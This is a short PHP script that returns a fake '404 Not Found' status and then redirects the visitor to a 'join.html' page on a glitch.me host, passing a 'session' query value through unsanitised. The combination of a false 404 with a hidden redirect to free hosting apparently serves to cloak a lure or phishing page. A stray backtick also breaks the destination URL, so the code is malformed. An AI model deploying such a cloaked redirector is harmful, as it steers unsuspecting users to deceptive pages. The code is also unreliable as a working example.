<?php
header( "HTTP/1.1 404 Not Found" );

$uri = "#$_GET[session]";
$sub = explode('.', $_SERVER['HTTP_HOST'])[0];

    $url = "https://charm-spice-area.glitch.me/`join.html$uri";

header( "Location: $url" );
  exit();
  ?>